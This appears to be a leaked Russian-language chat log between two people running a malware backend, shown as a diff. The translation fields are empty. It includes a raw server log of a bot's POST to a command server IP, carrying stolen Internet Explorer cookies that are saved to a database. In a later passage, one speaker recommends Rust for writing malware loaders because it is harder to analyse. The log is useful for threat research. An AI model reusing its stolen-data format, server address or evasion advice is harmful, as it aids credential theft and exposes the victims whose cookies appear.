@@ -1,0 +1,902 @@
+##################################################
+Conversation between:
+	- buza@q3mcco35auwcstmt.onion
+	- zulas@q3mcco35auwcstmt.onion
+176 messages
+first: 2021-08-27T09:29:17.322472
+last:  2021-09-14T11:56:43.867421
+##################################################
+
+2021-08-27T09:29:17.322472  buza@q3mcco35auwcstmt.onion
+	[ru] привет
+	[en] <?>
+	[fr] <?>
+
+2021-08-27T09:52:31.721039  zulas@q3mcco35auwcstmt.onion
+	[ru] привет
+	[en] <?>
+	[fr] <?>
+
+2021-08-27T09:52:42.221281  buza@q3mcco35auwcstmt.onion
+	[ru] помоги там плиз с бэком
+	[en] <?>
+	[fr] <?>
+
+2021-08-27T09:52:47.349214  buza@q3mcco35auwcstmt.onion
+	[ru] деф говорит ты в курсе проблемы
+	[en] <?>
+	[fr] <?>
+
+2021-08-27T09:53:03.468160  zulas@q3mcco35auwcstmt.onion
+	[ru] привет да . надо конфу собрать .
+	[en] <?>
+	[fr] <?>
+
+2021-08-27T09:53:06.923116  zulas@q3mcco35auwcstmt.onion
+	[ru] с клиентским
+	[en] <?>
+	[fr] <?>
+
+2021-08-27T09:53:34.035025  zulas@q3mcco35auwcstmt.onion
+	[ru] еще можно зайти на сервер где моя програ крутится ?
+	[en] <?>
+	[fr] <?>
+
+2021-08-27T09:53:58.833250  buza@q3mcco35auwcstmt.onion
+	[ru] тебе напишет сейчас driver@
+	[en] <?>
+	[fr] <?>
+
+2021-08-27T09:54:07.760413  buza@q3mcco35auwcstmt.onion
+	[ru] дальше в рабочем порядке, доступы через дефа
+	[en] <?>
+	[fr] <?>
+
+2021-08-27T09:54:11.212511  buza@q3mcco35auwcstmt.onion
+	[ru] конфу соберем
+	[en] <?>
+	[fr] <?>
+
+2021-08-27T13:42:41.310682  buza@q3mcco35auwcstmt.onion
+	[ru] слушай
+	[en] <?>
+	[fr] <?>
+
+2021-08-27T13:42:51.133678  buza@q3mcco35auwcstmt.onion
+	[ru] ты ведь знаешь протокол HTTP?
+	[en] <?>
+	[fr] <?>
+
+2021-08-27T13:43:07.405468  zulas@q3mcco35auwcstmt.onion
+	[ru] знаю ) я вообще должен ожидать там чистый текст
+	[en] <?>
+	[fr] <?>
+
+2021-08-27T13:43:27.375375  buza@q3mcco35auwcstmt.onion
+	[ru] у меня затруднение со словом "там"
+	[en] <?>
+	[fr] <?>
+
+2021-08-27T13:44:02.578681  zulas@q3mcco35auwcstmt.onion
+	[ru] а у меня нет ) у меня только затруднения в том . что я не вижу нормального хттп
+	[en] <?>
+	[fr] <?>
+
+2021-08-27T13:44:10.849111  buza@q3mcco35auwcstmt.onion
+	[ru] POST / HTTP/1.1
+Content-Type:
+Content-Length:
+Content-Encoding:
+Transfer-Encoding: multipart/form-data
+	[en] <?>
+	[fr] <?>
+
+2021-08-27T13:44:16.254825  buza@q3mcco35auwcstmt.onion
+	[ru] далее тело запроса
+	[en] <?>
+	[fr] <?>
+
+2021-08-27T13:44:25.639586  buza@q3mcco35auwcstmt.onion
+	[ru] ты что, хочешь сказать что заголовков нет вообще?
+	[en] <?>
+	[fr] <?>
+
+2021-08-27T13:44:52.648045  zulas@q3mcco35auwcstmt.onion
+	[ru] ну ты скачал файлы ?
+	[en] <?>
+	[fr] <?>
+
+2021-08-27T13:44:58.692368  buza@q3mcco35auwcstmt.onion
+	[ru] скачал
+	[en] <?>
+	[fr] <?>
+
+2021-08-27T13:45:15.056415  buza@q3mcco35auwcstmt.onion
+	[ru] в них нет заголовков HTTP
+	[en] <?>
+	[fr] <?>
+
+2021-08-27T13:45:16.234032  zulas@q3mcco35auwcstmt.onion
+	[ru] бывает нормальные проскакивают .. с POST
+а бывает такие вот как в файлах
+	[en] <?>
+	[fr] <?>
+
+2021-08-27T13:45:52.766592  buza@q3mcco35auwcstmt.onion
+	[ru] то есть тебе приходит запрос без заголовков вообще
+	[en] <?>
+	[fr] <?>
+
+2021-08-27T13:46:01.306363  buza@q3mcco35auwcstmt.onion
+	[ru] верно?
+	[en] <?>
+	[fr] <?>
+
+2021-08-27T13:46:36.186020  zulas@q3mcco35auwcstmt.onion
+	[ru] ну вот ты видел что приходит
+	[en] <?>
+	[fr] <?>
+
+2021-08-27T13:47:00.083279  buza@q3mcco35auwcstmt.onion
+	[ru] это конечно очень сильный постмодернизьм, но я могу предположить еще что это HTTP/2.0
+	[en] <?>
+	[fr] <?>
+
+2021-08-27T13:47:15.697249  zulas@q3mcco35auwcstmt.onion
+	[ru] а он там вообще должен быть ?
+	[en] <?>
+	[fr] <?>
+
+2021-08-27T13:47:16.829900  buza@q3mcco35auwcstmt.onion
+	[ru] хотя я не помню чтобы хоть один из модулей был переделан на его поддержку
+	[en] <?>
+	[fr] <?>
+
+2021-08-27T13:47:33.659196  buza@q3mcco35auwcstmt.onion
+	[ru] он не должен там быть, но я могу предположить почему он там может оказаться
+	[en] <?>
+	[fr] <?>
+
+2021-08-27T13:47:45.522056  buza@q3mcco35auwcstmt.onion
+	[ru] например как результат конверсии запроса на прокладке
+	[en] <?>
+	[fr] <?>
+
+2021-08-27T13:48:06.871998  zulas@q3mcco35auwcstmt.onion
+	[ru] ну вот в файле good.raw просвечивает http 1.1
+	[en] <?>
+	[fr] <?>
+
+2021-08-27T13:48:08.689192  buza@q3mcco35auwcstmt.onion
+	[ru] или потому что кто-то переделал модуль на стек winhttp с включенным http/2 и никому не сказал
+	[en] <?>
+	[fr] <?>
+
+2021-08-27T13:48:15.490845  buza@q3mcco35auwcstmt.onion
+	[ru] ну это пиздец
+	[en] <?>
+	[fr] <?>
+
+2021-08-27T13:48:40.181963  buza@q3mcco35auwcstmt.onion
+	[ru] а ты можешь прислать хорошие запросы, ты говоришь проскакивает нормальный POST ?
+	[en] <?>
+	[fr] <?>
+
+2021-08-27T13:48:44.472805  buza@q3mcco35auwcstmt.onion
+	[ru] так что видно что все норм
+	[en] <?>
+	[fr] <?>
+
+2021-08-27T13:48:49.807992  zulas@q3mcco35auwcstmt.onion
+	[ru] да могу . щас фильтрану
+	[en] <?>
+	[fr] <?>
+
+2021-08-27T13:49:57.455915  buza@q3mcco35auwcstmt.onion
+	[ru] я знаешь че думаю
+	[en] <?>
+	[fr] <?>
+
+2021-08-27T13:50:10.841049  buza@q3mcco35auwcstmt.onion
+	[ru] что там где POST, Это может быть просто перехват HTTP POST в виде как есть
+	[en] <?>
+	[fr] <?>
+
+2021-08-27T13:50:18.302518  zulas@q3mcco35auwcstmt.onion
+	[ru] 2021-08-27 16:43:08.319 [info] <0.3245.1>@http_handler:handle:20 Path /lib30/NASEEMCASH1_W617601.36CB7F3C9950F33B641F14CB7724D3DB/84/
+2021-08-27 16:43:08.319 [info] <0.3245.1>@http_handler:handle:29 Request for {client,undefined,<<"NASEEMCASH1_W617601.36CB7F3C9950F33B641F14CB7724D3DB">>,{3948389396567356219,7214507992180642779},<<"NASEEMCASH1">>,<<"lib30">>,<<"windows">>,<<"617601">>,undefined,undefined,<<"NASEEMCASH1_W617601">>} <<"84">> [<<>>]
+2021-08-27 16:43:08.319 [info] <0.3245.1> Data: <<"POST /lib30/NASEEMCASH1_W617601.36CB7F3C9950F33B641F14CB7724D3DB/84/ HTTP/1.1\r\nAccept: */*\r\nContent-Type: multipart/form-data; boundary=---------XTYXAMVRSGLSDPSR\r\nConnection: Close\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; Tablet PC 2.0)\r\nHost: 103.56.207.249:443\r\nContent-Length: 90184\r\nCache-Control: no-cache\r\n\r\n-----------XTYXAMVRSGLSDPSR\r\nContent-Disposition: form-data; name=\"data\"\r\n\r\nQWRtaW5pc3RyYXRvcg==|IE|MjQ2MDU5MTM1LmxvZy5vcHRpbWl6ZWx5LmNvbQ==|ZW5kX3VzZXJfaWQ=|b2V1MTM4ODIxNDM1MzQ3MnIwLjExMDEyMzM5MTYwNjcyODA3|1240428402|1240428402|Lw==\r\nQWRtaW5pc3RyYXRvcg==|IE||||1240428288|1240428288|\r\nQWRtaW5pc3RyYXRvcg==|IE|M2EyaWxhdGkuY29t|T1hfc2Q=|MQ==|1240428412|1240428412|Lw==\r\nQWRtaW5pc3RyYXRvcg==|IE|MzM2NWZjNTU2Y2I1YWQwODdkMTU4YjUyY2I1NTUzNDQxYTlmNjA4NjIzLTEzMjUwMDgzNTM0NGVjZWQ=||X2VtX3Z0|1240428288|1240428288|\r\nQWRtaW5pc3RyYXRvcg==|IE|ZTFkNmEyNDUyODU0MGU2ZTQ3ODQ2ODQ4NGQ1YjUzNDRlY2VkYWFjZDg1LTUzODAzMzAzNTM0NGVjZWQ=||X2VtX3Y=|1240428288|1240428288|\r\nQWRtaW5pc3RyYXRvcg==|IE|LTE=||X2VtX3N2|1240428288|1240428288|\r\nQWRtaW5pc3RyYXRvcg==|IE|MQ==||X2VtX2hs|1240428288|1240428288|\r\nQWRtaW5pc3RyYXRvcg==|IE|OTM5NjAxNTkuMTM2NDE3MDI5MS4xMzk3MDI2MDI4LjEzOTcwMjYwMjguMTM5Nz...">> 
+2021-08-27 16:43:17.173 [info] <0.3245.1>@db:equery:46 equery <<"INSERT INTO data84 (created_at, \"group\", id_low, id_high, username, browser, \"domain\", cookie_name, cookie_value, created, expires, path ) VALUES ( now(), $1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11 )">> [<<"lib30">>,7214507992180642779,3948389396567356219,<<"Administrator">>,<<"IE">>,<<"246059135.log.optimizely.com">>,<<"end_user_id">>,<<"oeu1388214353472r0.11012339160672807">>,<<"1240428402">>,<<"1240428402">>,<<"/">>]
+	[en] <?>
+	[fr] <?>
+
+2021-08-27T13:50:19.729454  buza@q3mcco35auwcstmt.onion
+	[ru] в смысле, это не заголовки, а это тело )
+	[en] <?>
+	[fr] <?>
+
+2021-08-27T13:50:29.426050  buza@q3mcco35auwcstmt.onion
+	[ru] да да
+	[en] <?>
+	[fr] <?>
+
+2021-08-27T13:50:42.491913  zulas@q3mcco35auwcstmt.onion
+	[ru] я хз .. я поставил логирование в самом начале .. т.е. лог показывает то что мне приходит как оно есть
+	[en] <?>
+	[fr] <?>
+
+2021-09-10T13:20:27.391516  zulas@q3mcco35auwcstmt.onion
+	[ru] привет . .вам Rust разработчик не нужен ? Solana слышал о таком ?
+	[en] <?>
+	[fr] <?>
+
+2021-09-10T15:39:49.325293  buza@q3mcco35auwcstmt.onion
+	[ru] привет
+	[en] <?>
+	[fr] <?>
+
+2021-09-10T15:40:00.543519  buza@q3mcco35auwcstmt.onion
+	[ru] солана это ник?
+	[en] <?>
+	[fr] <?>
+
+2021-09-10T17:20:46.005005  zulas@q3mcco35auwcstmt.onion
+	[ru] https://solana.com/
+https://habr.com/ru/post/560566/
+	[en] <?>
+	[fr] <?>
+
+2021-09-10T19:39:28.072951  zulas@q3mcco35auwcstmt.onion
+	[ru] https://solana.com/
+https://habr.com/ru/post/560566/
+	[en] <?>
+	[fr] <?>
+
+2021-09-10T19:40:10.822438  buza@q3mcco35auwcstmt.onion
+	[ru] возможно нужен
+	[en] <?>
+	[fr] <?>
+
+2021-09-12T07:28:13.119490  buza@q3mcco35auwcstmt.onion
+	[ru] возможно нужен
+	[en] <?>
+	[fr] <?>
+
+2021-09-12T08:40:50.095526  zulas@q3mcco35auwcstmt.onion
+	[ru] а конкретнее ?
+	[en] <?>
+	[fr] <?>
+
+2021-09-13T08:01:30.169011  zulas@q3mcco35auwcstmt.onion
+	[ru] а конкретнее ?
+	[en] <?>
+	[fr] <?>
+
+2021-09-13T12:50:21.743065  buza@q3mcco35auwcstmt.onion
+	[ru] ку
+	[en] <?>
+	[fr] <?>
+
+2021-09-13T15:15:49.964779  buza@q3mcco35auwcstmt.onion
+	[ru] ку
+	[en] <?>
+	[fr] <?>
+
+2021-09-13T15:32:30.638051  zulas@q3mcco35auwcstmt.onion
+	[ru] ку
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T07:33:28.416089  zulas@q3mcco35auwcstmt.onion
+	[ru] ку
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T07:33:39.984420  buza@q3mcco35auwcstmt.onion
+	[ru] я тут
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:05:14.668704  buza@q3mcco35auwcstmt.onion
+	[ru] я тут
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:05:36.468422  zulas@q3mcco35auwcstmt.onion
+	[ru] и я тут .. ты что то писал мне
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:05:45.743080  buza@q3mcco35auwcstmt.onion
+	[ru] привет
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:05:58.586484  buza@q3mcco35auwcstmt.onion
+	[ru] нужен скорее по блокчейну человек
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:06:06.349167  buza@q3mcco35auwcstmt.onion
+	[ru] но там проект идет медленно
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:06:10.985219  zulas@q3mcco35auwcstmt.onion
+	[ru] я по нему ноль
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:06:17.853153  buza@q3mcco35auwcstmt.onion
+	[ru] так твой чел по расту не ноль
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:06:20.461183  buza@q3mcco35auwcstmt.onion
+	[ru] солана это блокчейн
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:06:37.193147  zulas@q3mcco35auwcstmt.onion
+	[ru] я просто хотел начать с Rust что то делать .. вот подумал может есть какие для тебя интересные темы
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:06:51.003326  buza@q3mcco35auwcstmt.onion
+	[ru] что с отр у тебя?
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:07:29.874625  zulas@q3mcco35auwcstmt.onion
+	[ru] ) да .. так я и говорю .. Солана на расте писана .. соотвественно я растом хочу занятся, ну и чтобы с пользой было -- солану ковырять .
+ну а чтобы польза не только мне была ... то ковырять можно с какой то целью
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:07:49.551959  zulas@q3mcco35auwcstmt.onion
+	[ru] > что с отр у тебя?
+не понял вопроса
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:08:25.633744  buza@q3mcco35auwcstmt.onion
+	[ru] не включается
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:09:22.709012  zulas@q3mcco35auwcstmt.onion
+	[ru] я его не ставил
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:09:27.189508  zulas@q3mcco35auwcstmt.onion
+	[ru] забил так сказать
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:12:29.787323  zulas@q3mcco35auwcstmt.onion
+	[ru] так что с соланой ?
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:15:04.170123  buza@q3mcco35auwcstmt.onion
+	[ru] погодь
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:15:12.061243  buza@q3mcco35auwcstmt.onion
+	[ru] пару мин
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:20:44.932259  buza@q3mcco35auwcstmt.onion
+	[ru] да не то что с соланой
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:20:47.498681  buza@q3mcco35auwcstmt.onion
+	[ru] я думал уже есть опыт
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:20:57.280979  buza@q3mcco35auwcstmt.onion
+	[ru] сам по себе раст хорош чтобы лоадеры писать и всякую малварь )
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:21:13.650576  buza@q3mcco35auwcstmt.onion
+	[ru] т.к. это не С++ и его анализировать хуже, что автоматически что вручную
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:23:09.959576  zulas@q3mcco35auwcstmt.onion
+	[ru] почему хуже ? ) ну тот же асм код
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:23:21.881504  zulas@q3mcco35auwcstmt.onion
+	[ru] ну может просто средств анализа не так сильно пописано .. ну напишут
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:23:41.995327  buza@q3mcco35auwcstmt.onion
+	[ru] это уже известный факт
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:23:52.383828  zulas@q3mcco35auwcstmt.onion
+	[ru] малварь писать не хочу .. )
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:23:54.207590  buza@q3mcco35auwcstmt.onion
+	[ru] rust go nim и даже с#
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:24:25.097124  zulas@q3mcco35auwcstmt.onion
+	[ru] малварь на шарпе -- это как в космос полететь на бейсике .. у него рантайм жирный ) не нужен такой
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:26:35.754731  zulas@q3mcco35auwcstmt.onion
+	[ru] так где я могу применить раст у тебя ?
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:26:52.374932  buza@q3mcco35auwcstmt.onion
+	[ru] в написании малвари
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:27:54.930712  buza@q3mcco35auwcstmt.onion
+	[ru] дался тебе этот раст
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:28:04.150012  buza@q3mcco35auwcstmt.onion
+	[ru] это все гогно )
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:28:22.589828  buza@q3mcco35auwcstmt.onion
+	[ru] гугл продвигает его Линусу, давай чувак пиши пиши ядро на нем
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:28:36.816086  buza@q3mcco35auwcstmt.onion
+	[ru] а сам ни хера, не использует ни в каких своих проектах )
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:28:43.296599  buza@q3mcco35auwcstmt.onion
+	[ru] диверсанты хреновы
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:28:52.837132  zulas@q3mcco35auwcstmt.onion
+	[ru] у гугла есть голанг )
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:29:00.265356  buza@q3mcco35auwcstmt.onion
+	[ru] еще худшее гогно
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:29:03.489254  buza@q3mcco35auwcstmt.onion
+	[ru] пиздец просто
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:29:08.170751  zulas@q3mcco35auwcstmt.onion
+	[ru] а что не гогно ?
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:29:19.347543  buza@q3mcco35auwcstmt.onion
+	[ru] я даже подумать не мог что Ритчи так запомоится
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:29:24.435125  buza@q3mcco35auwcstmt.onion
+	[ru] Си
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:29:36.280635  zulas@q3mcco35auwcstmt.onion
+	[ru] а .. так ты пенсионер сишник )
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:29:44.171139  buza@q3mcco35auwcstmt.onion
+	[ru] я реалист
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:30:01.989526  zulas@q3mcco35auwcstmt.onion
+	[ru] так чем тогда гогно раст ?
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:30:15.912485  buza@q3mcco35auwcstmt.onion
+	[ru] малым пробегом
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:30:38.189263  buza@q3mcco35auwcstmt.onion
+	[ru] качества самого языка даже неважны, как и для го
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:30:53.398860  buza@q3mcco35auwcstmt.onion
+	[ru] все проблемы что у меня всплывали были именно с нестабильной и незрелой экосистемой
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:31:17.623444  buza@q3mcco35auwcstmt.onion
+	[ru] оно все не готово для прода, несмотря на надувание щёк
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:32:22.695655  zulas@q3mcco35auwcstmt.onion
+	[ru] а эрланг ?
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:32:41.905550  buza@q3mcco35auwcstmt.onion
+	[ru] я очень мало о нем знаю, спустя столько лет
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:32:53.461336  buza@q3mcco35auwcstmt.onion
+	[ru] думаю что он очень эффективен
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:33:03.236087  zulas@q3mcco35auwcstmt.onion
+	[ru] ну ... большой пробег .. но тоже гогно в твоем понимании )
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:33:10.307725  buza@q3mcco35auwcstmt.onion
+	[ru] нет, он нет
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:33:32.887604  zulas@q3mcco35auwcstmt.onion
+	[ru] так а что тогда от вас задач нету по написанию чего то нового  ?
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:33:46.058423  buza@q3mcco35auwcstmt.onion
+	[ru] причина простая
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:33:57.572986  buza@q3mcco35auwcstmt.onion
+	[ru] это экзотика, на которую не найти спецов на рынке
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:34:01.964360  buza@q3mcco35auwcstmt.onion
+	[ru] их тупо нету
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:34:19.049595  buza@q3mcco35auwcstmt.onion
+	[ru] а на пхп по девять семдесять за килограмм
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:34:43.826197  buza@q3mcco35auwcstmt.onion
+	[ru] это же кстати относится к любой экзотике - набор людей
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:34:46.457858  zulas@q3mcco35auwcstmt.onion
+	[ru] ну вот я есть ) а задач нету
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:34:50.313200  buza@q3mcco35auwcstmt.onion
+	[ru] и к расту и к го
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:35:06.489172  zulas@q3mcco35auwcstmt.onion
+	[ru] ну .. го уже не экзотика по сравнению с растом .. но меня что то на раст тянет
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:35:32.848446  zulas@q3mcco35auwcstmt.onion
+	[ru] видимо потому что экзотика
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:35:48.461682  zulas@q3mcco35auwcstmt.onion
+	[ru] а ближе к пенсии я с хаскелем разберусь ... вот там уж экзотика-экзотик
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:38:50.713559  zulas@q3mcco35auwcstmt.onion
+	[ru] так что пишем на эрле нового ? )
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:40:23.959099  buza@q3mcco35auwcstmt.onion
+	[ru] я бы лучше дал задачу тебе обучить людей эрлу
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:41:51.528362  buza@q3mcco35auwcstmt.onion
+	[ru] вот смотри
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:41:59.177192  buza@q3mcco35auwcstmt.onion
+	[ru] я еще раз повторю про экзотику
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:42:22.530687  buza@q3mcco35auwcstmt.onion
+	[ru] я ведь набираю людей постоянно, сталкиваюсь с законами рынка
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:42:30.993518  buza@q3mcco35auwcstmt.onion
+	[ru] и я давно в ит, очень давно
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:42:52.578420  buza@q3mcco35auwcstmt.onion
+	[ru] есть желание разработчиков к новому интересному
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:42:59.750285  buza@q3mcco35auwcstmt.onion
+	[ru] и есть законы эволюции
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:43:26.504630  buza@q3mcco35auwcstmt.onion
+	[ru] по законам эволюции, востребованы хорошо проверенные решения, обкатанные временем, от которых отвалилось все лишнее
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:43:34.404180  buza@q3mcco35auwcstmt.onion
+	[ru] как например колесо или кобол
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:43:55.526886  buza@q3mcco35auwcstmt.onion
+	[ru] новая экзотика появляется и умирает, точно так же как биологические виды
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:44:08.142994  buza@q3mcco35auwcstmt.onion
+	[ru] тот кто себя зарекомендует, он остается на рынке
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:44:10.365308  zulas@q3mcco35auwcstmt.onion
+	[ru] кобол востребован - потому на нем дохрена легаси в банках ) и там бородатые очкарики рулят .. я таким буду лет через 30 )
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:44:24.423665  buza@q3mcco35auwcstmt.onion
+	[ru] ровно такая же ситуация с эрлангом
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:44:28.994548  buza@q3mcco35auwcstmt.onion
+	[ru] как и с коболом
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:44:32.960756  zulas@q3mcco35auwcstmt.onion
+	[ru] по части обучения -- обучить можно, но это дорого стоит т.к. фактически обучаю конкурентов себе )
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:45:13.187742  zulas@q3mcco35auwcstmt.onion
+	[ru] нет .. эрл живее всех живых ) ..
+ну если хипстерское -- то эликсир )
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:45:16.604885  buza@q3mcco35auwcstmt.onion
+	[ru] он хорошо шел в свои годы, но теперь по нему никого нету на рынке и он легаси
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:45:41.991742  buza@q3mcco35auwcstmt.onion
+	[ru] вот например node.js - он возник, он себя зарекомендовал, он наравне с пхп сейчас
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:46:01.071225  buza@q3mcco35auwcstmt.onion
+	[ru] ткаие дела
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:46:13.274341  zulas@q3mcco35auwcstmt.onion
+	[ru] такое же унылое г .. скажи нода умеет параллелится ? .. да вообще джабаскрипт - это такое уёбище ) неподдерживаемое
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:46:29.122591  zulas@q3mcco35auwcstmt.onion
+	[ru] что написал один -- второй хрен поддерживать сможет )
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:46:45.054840  buza@q3mcco35auwcstmt.onion
+	[ru] это вообще никого не волнует что может язык
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:46:54.483972  buza@q3mcco35auwcstmt.onion
+	[ru] волнует только где взять человека на него
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:47:04.157558  buza@q3mcco35auwcstmt.onion
+	[ru] если есть резюме по ним, то и хорошо
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:47:11.079306  buza@q3mcco35auwcstmt.onion
+	[ru] если нет, то язык не будет востребован
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:47:25.725033  zulas@q3mcco35auwcstmt.onion
+	[ru] ну как не волнует --- если гвозди микроскопом забирвать -- то далеко не уедиш
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:47:39.264378  buza@q3mcco35auwcstmt.onion
+	[ru] причем лучше взять очень плохой язык, по которому очень дешевые специалисты, чем очень хороший и с небольшим количеством спецов
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:47:56.291378  zulas@q3mcco35auwcstmt.onion
+	[ru] я с тобой согласен ) .. но если так рассуждать . то только СИ был бы живее всех живых
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:48:05.977165  buza@q3mcco35auwcstmt.onion
+	[ru] я тебе говорю реальную логику, которой руководствуюсь и я, и все кто набирает людей
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:48:17.707444  zulas@q3mcco35auwcstmt.onion
+	[ru] да я понимаю ) ..
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:48:41.932267  zulas@q3mcco35auwcstmt.onion
+	[ru] сайтеги писать на ноде конечно можно ) а вот нормальный сервис запилить ... тут уже ответственно нужно подходить
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:52:09.962041  zulas@q3mcco35auwcstmt.onion
+	[ru] так что про эликсир скажешь ? это же эрланг тот же
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:53:40.265912  buza@q3mcco35auwcstmt.onion
+	[ru] то что я о нем ничего не знаю
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:54:50.989919  zulas@q3mcco35auwcstmt.onion
+	[ru] странно .. он сейчас более в хайпе чем эрл
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:55:06.807772  zulas@q3mcco35auwcstmt.onion
+	[ru] тот же эрл только сбоку .. почитай )
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T10:55:08.935962  zulas@q3mcco35auwcstmt.onion
+	[ru] типа современный
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T11:32:32.338572  zulas@q3mcco35auwcstmt.onion
+	[ru] так что с растом то --- гогно не нужное ? )
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T11:33:44.971348  buza@q3mcco35auwcstmt.onion
+	[ru] да я ж сказал
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T11:33:53.974297  buza@q3mcco35auwcstmt.onion
+	[ru] он хорош как экзотика именно в малвари
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T11:35:19.332849  zulas@q3mcco35auwcstmt.onion
+	[ru] малвари не для меня .. где мы можем найти еще точек пересечения друг для друга ?
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T11:37:54.441524  buza@q3mcco35auwcstmt.onion
+	[ru] зачем по-твоему юзается твой бэкенд?
+	[en] <?>
+	[fr] <?>
+
+2021-09-14T11:40:04.187987  zulas@q3mcco35auwcstmt.onion
